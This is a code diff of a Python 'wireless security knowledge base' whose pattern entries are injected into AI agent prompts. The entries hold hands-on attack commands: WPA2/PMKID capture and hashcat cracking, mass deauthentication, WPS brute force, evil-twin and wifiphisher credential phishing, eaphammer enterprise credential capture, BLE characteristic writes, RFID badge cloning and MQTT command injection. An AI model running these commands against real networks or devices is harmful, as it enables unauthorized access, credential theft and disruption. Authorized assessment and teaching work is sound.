@@ -1,11 +1,11 @@
 """Wireless security knowledge base.
 
-Deep knowledge about wireless attacks:
-1. WiFi (WPA2/WPA3) attacks
-2. Bluetooth exploitation
-3. RFID/NFC attacks
-4. Software-Defined Radio
-5. Wireless IDS evasion
+Deep knowledge about wireless vulnerabilities:
+1. WiFi attack techniques (WPA/WPA2/WPA3)
+2. Bluetooth and BLE exploitation
+3. Rogue access point detection
+4. WiFi client attacks
+5. IoT wireless protocol security
 """
 
 from __future__ import annotations
@@ -39,177 +39,173 @@ class WirelessPattern:
 
 WIRELESS_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "wl-001", "name": "WiFi WPA2/WPA3 Attacks",
-        "category": "wifi", "severity": "high",
-        "desc": "Attacking WiFi networks.",
+        "id": "wifi-001", "name": "WiFi Network Attacks",
+        "category": "wifi", "severity": "critical",
+        "desc": "WiFi WPA/WPA2/WPA3 attack techniques.",
         "detection": (
-            "WIFI ATTACKS:\n"
-            "MONITORING MODE:\n"
-            "  airmon-ng start wlan0  # Enable monitor mode\n"
-            "  airodump-ng wlan0mon   # Discover networks\n"
-            "WPA2-PSK ATTACK:\n"
-            "  # Capture 4-way handshake\n"
+            "WiFi NETWORK ATTACKS:\n"
+            "WPA2 ATTACKS:\n"
+            "  # Monitor mode\n"
+            "  airmon-ng start wlan0\n"
+            "  # Capture handshake\n"
             "  airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon\n"
-            "  # Deauth to force reconnection\n"
-            "  aireplay-ng -0 5 -a <bssid> -c <client> wlan0mon\n"
-            "  # Crack with hashcat\n"
-            "  hashcat -m 22000 capture.hc22000 wordlist.txt\n"
-            "  # Or with aircrack-ng\n"
+            "  # Deauth to force handshake\n"
+            "  aireplay-ng -0 5 -a <bssid> wlan0mon\n"
+            "  # Crack handshake\n"
             "  aircrack-ng -w wordlist.txt capture.cap\n"
+            "  hashcat -m 22000 capture.hc22000 wordlist.txt\n"
             "PMKID ATTACK (clientless):\n"
-            "  # No client needed — grab PMKID from AP\n"
-            "  hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=3\n"
-            "  hcxpcapngtool dump.pcapng -o hash.hc22000\n"
+            "  hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon --enable_status=15\n"
+            "  hcxpcapngtool -o hash.hc22000 pmkid.pcapng\n"
             "  hashcat -m 22000 hash.hc22000 wordlist.txt\n"
-            "WPA3-SAE:\n"
-            "  # Dragonblood attacks\n"
-            "  - Timing side-channel → password partition\n"
-            "  - Cache-based side-channel\n"
-            "  - Downgrade attack (if WPA2 transition mode)\n"
-            "EVIL TWIN:\n"
-            "  # Create fake AP with same SSID\n"
-            "  hostapd-wpe  # Modified hostapd for credential capture\n"
-            "  # Or use wifiphisher for automated attacks"
+            "WPA3/SAE:\n"
+            "  - Dragonblood attacks (CVE-2019-9494/9496)\n"
+            "  - Side-channel on SAE handshake\n"
+            "  - Downgrade to WPA2 if transition mode\n"
+            "WPS:\n"
+            "  reaver -i wlan0mon -b <bssid> -vv\n"
+            "  bully -b <bssid> wlan0mon\n"
+            "  wash -i wlan0mon  # Find WPS-enabled APs"
         ),
         "tools": ["aircrack-ng", "hashcat", "hcxdumptool"],
     },
     {
-        "id": "wl-002", "name": "Bluetooth Exploitation",
+        "id": "wifi-002", "name": "Bluetooth Exploitation",
         "category": "bluetooth", "severity": "high",
-        "desc": "Attacking Bluetooth and BLE devices.",
+        "desc": "Bluetooth and BLE security assessment.",
         "detection": (
             "BLUETOOTH EXPLOITATION:\n"
             "SCANNING:\n"
-            "  hcitool scan  # Classic Bluetooth discovery\n"
-            "  hcitool lescan  # BLE discovery\n"
-            "  bluetoothctl scan on  # Interactive scanning\n"
-            "  bettercap -eval 'ble.recon on'  # Advanced BLE recon\n"
-            "BLUESNARFING:\n"
-            "  - Unauthorized access to device data\n"
-            "  - Contacts, messages, calendar, files\n"
-            "  - bluesnarfer -b <btaddr> -r 1-100\n"
-            "BLUEBORNE:\n"
-            "  - Remote code execution over Bluetooth\n"
-            "  - No pairing required, no discoverable mode needed\n"
-            "  - CVE-2017-1000251 (Linux kernel)\n"
-            "  - CVE-2017-0785 (Android)\n"
+            "  hcitool scan  # Classic Bluetooth\n"
+            "  hcitool lescan  # BLE devices\n"
+            "  bluetoothctl scan on\n"
+            "  # Detailed info\n"
+            "  hcitool info <bdaddr>\n"
+            "  sdptool browse <bdaddr>  # Service discovery\n"
             "BLE ATTACKS:\n"
-            "  - GATT service enumeration\n"
-            "  gatttool -b <addr> --primary  # List services\n"
-            "  gatttool -b <addr> --char-read -a <handle>  # Read data\n"
-            "  - Write to characteristics (unlock, modify settings)\n"
-            "  gatttool -b <addr> --char-write-req -a <handle> -n <value>\n"
-            "  - Replay attacks on BLE commands\n"
-            "  - Eavesdropping with Ubertooth One\n"
-            "KNOB ATTACK:\n"
-            "  - Key Negotiation of Bluetooth\n"
-            "  - Force 1-byte encryption key → trivially breakable"
+            "  # GATTacker: MITM for BLE\n"
+            "  # Enumerate GATT services\n"
+            "  gatttool -b <bdaddr> --primary\n"
+            "  gatttool -b <bdaddr> --characteristics\n"
+            "  gatttool -b <bdaddr> --char-read -a <handle>\n"
+            "  # Write to characteristic\n"
+            "  gatttool -b <bdaddr> --char-write-req -a <handle> -n <value>\n"
+            "BLUEBORNE:\n"
+            "  - RCE over Bluetooth (no pairing needed)\n"
+            "  - Affects Android, iOS, Windows, Linux\n"
+            "  - CVE-2017-0781/0782/0783/0785\n"
+            "BLUETOOTH CLASSIC:\n"
+            "  - BlueSmack (L2CAP ping flood DoS)\n"
+            "  - BlueBorne (RCE)\n"
+            "  - KNOB attack (encryption key negotiation)\n"
+            "  - BIAS attack (impersonation)\n"
+            "TOOLS:\n"
+            "  btlejack  # BLE sniffer and MITM\n"
+            "  Ubertooth  # Bluetooth sniffer hardware\n"
+            "  GATTacker  # BLE MITM proxy"
         ),
-        "tools": ["hcitool", "gatttool", "bettercap"],
+        "tools": ["hcitool", "gatttool", "btlejack"],
     },
     {
-        "id": "wl-003", "name": "RFID/NFC Security",
-        "category": "rfid", "severity": "high",
-        "desc": "Attacking RFID and NFC systems.",
+        "id": "wifi-003", "name": "Rogue Access Point",
+        "category": "rogue_ap", "severity": "critical",
+        "desc": "Rogue AP and evil twin attack techniques.",
         "detection": (
-            "RFID/NFC ATTACKS:\n"
-            "MIFARE CLASSIC:\n"
-            "  # Known-key attack\n"
-            "  mfoc -P 500 -O dump.mfd  # Nested authentication attack\n"
-            "  mfcuk -C -R 0:A  # DarkSide attack (unknown keys)\n"
-            "  # Clone card\n"
-            "  nfc-mfclassic w a dump.mfd  # Write dump to blank card\n"
-            "MIFARE DESFIRE:\n"
-            "  - Side-channel attacks on DES/AES operations\n"
-            "  - Differential power analysis\n"
-            "  - Relay attacks (extend communication range)\n"
-            "NFC RELAY:\n"
-            "  - NFCGate: Relay NFC between two Android phones\n"
-            "  - Relay payment transactions\n"
-            "  - Relay access control badges\n"
-            "  - Range extension: meters → global (via internet)\n"
-            "PROXMARK3:\n"
-            "  # Universal RFID tool\n"
-            "  proxmark3> lf search  # Low frequency card detection\n"
-            "  proxmark3> hf search  # High frequency card detection\n"
-            "  proxmark3> hf mf autopwn  # Auto-attack Mifare\n"
-            "  proxmark3> lf em 410x clone  # Clone EM4100\n"
-            "  proxmark3> hf mf sim  # Simulate Mifare card\n"
-            "ACCESS CONTROL:\n"
-            "  - Clone employee badges\n"
-            "  - Replay door access credentials\n"
-            "  - Downgrade to weaker protocol"
+            "ROGUE ACCESS POINT:\n"
+            "EVIL TWIN:\n"
+            "  # Create rogue AP matching target SSID\n"
+            "  hostapd-mana hostapd.conf\n"
+            "  # DNS + DHCP\n"
+            "  dnsmasq -C dnsmasq.conf\n"
+            "  # Captive portal for credential capture\n"
+            "  # Tools: wifiphisher, fluxion\n"
+            "WIFIPHISHER:\n"
+            "  wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade\n"
+            "  # Scenarios: firmware-upgrade, oauth-login, plugin-update\n"
+            "KARMA/MANA:\n"
+            "  - Respond to all probe requests\n"
+            "  - Devices auto-connect to 'known' networks\n"
+            "  - Capture credentials via MITM\n"
+            "  - hostapd-mana with karma mode\n"
+            "DETECTION:\n"
+            "  # Detect rogue APs\n"
+            "  airodump-ng wlan0mon  # Look for duplicate SSIDs\n"
+            "  # Check MAC vendor vs expected\n"
+            "  # Monitor for deauth frames\n"
+            "  # Wireless IDS: Kismet\n"
+            "  kismet -c wlan0  # Full wireless monitoring"
         ),
-        "tools": ["proxmark3", "nfc-tools", "mfoc"],
+        "tools": ["hostapd-mana", "wifiphisher", "kismet"],
     },
     {
-        "id": "wl-004", "name": "Software-Defined Radio Attacks",
-        "category": "sdr", "severity": "high",
-        "desc": "Using SDR for wireless protocol attacks.",
+        "id": "wifi-004", "name": "WiFi Client Attacks",
+        "category": "client", "severity": "high",
+        "desc": "Attacks targeting WiFi clients.",
         "detection": (
-            "SDR ATTACKS:\n"
-            "EQUIPMENT:\n"
-            "  - RTL-SDR (cheap receiver, ~$20)\n"
-            "  - HackRF One (TX/RX, 1MHz-6GHz)\n"
-            "  - YARD Stick One (sub-GHz transceiver)\n"
-            "  - BladeRF (full-duplex, wider bandwidth)\n"
-            "COMMON TARGETS:\n"
-            "  - Car key fobs (315/433 MHz)\n"
-            "  - Garage door openers\n"
-            "  - Wireless sensors/alarms\n"
-            "  - Baby monitors\n"
-            "  - Pagers (POCSAG)\n"
-            "  - ADS-B (aircraft tracking)\n"
-            "REPLAY ATTACK:\n"
-            "  # Record signal\n"
-            "  hackrf_transfer -r capture.raw -f <freq> -s 2000000\n"
-            "  # Replay signal\n"
-            "  hackrf_transfer -t capture.raw -f <freq> -s 2000000\n"
-            "GNURADIO:\n"
-            "  - Visual signal processing framework\n"
-            "  - Demodulate/analyze any wireless protocol\n"
-            "  - Build custom transmitters/receivers\n"
-            "CELLULAR:\n"
-            "  - IMSI catchers (fake base stations)\n"
-            "  - SMS interception (2G downgrade)\n"
-            "  - Tools: srsLTE, Open5GS, OsmocomBB"
+            "WiFi CLIENT ATTACKS:\n"
+            "DEAUTHENTICATION:\n"
+            "  aireplay-ng -0 0 -a <bssid> wlan0mon  # Continuous deauth\n"
+            "  aireplay-ng -0 0 -a <bssid> -c <client> wlan0mon  # Targeted\n"
+            "  mdk4 wlan0mon d  # Mass deauth\n"
+            "PROBE REQUEST TRACKING:\n"
+            "  - Clients broadcast SSIDs they remember\n"
+            "  - Track device movement via probe requests\n"
+            "  - Fingerprint devices by probe patterns\n"
+            "  airodump-ng wlan0mon  # View probe requests\n"
+            "CLIENT ISOLATION BYPASS:\n"
+            "  - L3 routing between clients\n"
+            "  - ARP spoofing on wireless network\n"
+            "  - MAC spoofing to impersonate gateway\n"
+            "ENTERPRISE ATTACKS:\n"
+            "  # EAP-PEAP credential capture\n"
+            "  # Create rogue RADIUS server\n"
+            "  eaphammer --cert-wizard\n"
+            "  eaphammer -i wlan0 --auth wpa-eap --essid CorpWiFi \\\n"
+            "    --creds --negotiate balanced\n"
+            "  # Captured credentials: domain\\user:NTHash\n"
+            "TOOLS:\n"
+            "  eaphammer  # WPA-Enterprise attack tool\n"
+            "  mdk4  # Wireless attack toolkit\n"
+            "  Responder  # Capture NTLMv2 on wireless"
         ),
-        "tools": ["hackrf", "gnuradio", "rtl-sdr"],
+        "tools": ["aircrack-ng", "eaphammer", "mdk4"],
     },
     {
-        "id": "wl-005", "name": "Zigbee and Z-Wave Attacks",
-        "category": "zigbee", "severity": "medium",
-        "desc": "Attacking IoT mesh network protocols.",
+        "id": "wifi-005", "name": "IoT Wireless Protocols",
+        "category": "iot_wireless", "severity": "high",
+        "desc": "IoT wireless protocol security (Zigbee, Z-Wave, LoRa).",
         "detection": (
-            "ZIGBEE/Z-WAVE ATTACKS:\n"
-            "ZIGBEE:\n"
-            "  # Sniffing with KillerBee\n"
-            "  zbstumbler  # Discover Zigbee networks\n"
+            "IoT WIRELESS PROTOCOL SECURITY:\n"
+            "ZIGBEE (IEEE 802.15.4):\n"
+            "  - Default trust center key (well-known)\n"
+            "  - Key transport in plaintext during joining\n"
+            "  - Replay attacks on frame counter\n"
+            "  # Tools: KillerBee, Attify Zigbee Framework\n"
+            "  zbstumbler  # Find Zigbee networks\n"
             "  zbdump -c <channel> -w capture.pcap\n"
-            "  # Default key: ZigBeeAlliance09 (Trust Center Link Key)\n"
-            "  # If this key is used → decrypt all traffic\n"
-            "  # Key sniffing during device pairing\n"
-            "  zbwireshark  # Analyze in Wireshark\n"
-            "  # Replay attacks\n"
-            "  zbreplay -r capture.pcap\n"
-            "  # Inject packets\n"
-            "  zbassocflood  # Association flood DoS\n"
             "Z-WAVE:\n"
-            "  # Tools: Z-Wave sniffer (Sigma Designs, Zniffer)\n"
-            "  # S0 security: Known vulnerable (static key)\n"
-            "  # S2 security: Improved but implementation issues\n"
-            "  # Downgrade S2 → S0\n"
-            "  # EZ-Wave: Open-source Z-Wave analyzer\n"
-            "  # Attacks:\n"
-            "  - Force un-pairing → re-pair with attacker as controller\n"
-            "  - Replay door unlock commands\n"
-            "  - Inject commands to smart home devices\n"
-            "THREAD/MATTER:\n"
-            "  - Newer protocol, better security\n"
-            "  - But: Implementation bugs in early devices\n"
-            "  - Commissioning process vulnerabilities"
+            "  - S0 security: Weak key exchange\n"
+            "  - S2: Better but not universal\n"
+            "  - Downgrade from S2 to S0\n"
+            "  # Tools: EZ-Wave, Scapy-radio\n"
+            "LoRa/LoRaWAN:\n"
+            "  - ABP devices: Static keys\n"
+            "  - OTAA: Better key management\n"
+            "  - Frame counter reset attacks\n"
+            "  - Gateway impersonation\n"
+            "  # Tools: LoRa SDR receivers\n"
+            "MQTT (IoT messaging):\n"
+            "  - Default: No authentication\n"
+            "  - Subscribe to # (all topics)\n"
+            "  mosquitto_sub -h <target> -t '#' -v\n"
+            "  - Publish malicious commands\n"
+            "  mosquitto_pub -h <target> -t 'home/lights' -m 'OFF'\n"
+            "CoAP:\n"
+            "  - UDP-based, often no DTLS\n"
+            "  - Resource discovery: GET /.well-known/core\n"
+            "  coap-client -m get coap://<target>/.well-known/core"
         ),
-        "tools": ["killerbee", "hackrf", "wireshark"],
+        "tools": ["killerbee", "mosquitto"],
     },
 ]
 
@@ -217,7 +213,7 @@ WIRELESS_PATTERNS: list[dict[str, Any]] = [
 class WirelessSecurityKB:
     """Wireless security knowledge base.
 
-    Provides wireless attack patterns
+    Provides wireless vulnerability patterns
     injected into agent prompts.
     """
 
